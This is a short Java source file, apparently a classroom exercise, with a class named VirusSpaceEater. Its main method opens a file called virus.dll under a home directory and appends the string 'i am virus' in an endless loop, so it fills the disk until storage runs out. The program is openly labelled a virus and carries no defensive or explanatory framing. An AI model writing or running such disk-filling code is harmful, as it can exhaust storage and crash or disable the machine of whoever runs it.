package com.corejava.module10;

import java.io.FileWriter;
import java.io.IOException;

public class VirusSpaceEater {

	public static void main(String[] args) throws IOException {
		FileWriter fw=new FileWriter("/home/manisha/virus.dll", true);
		while(true)
			fw.write("i am virus");
	}
}
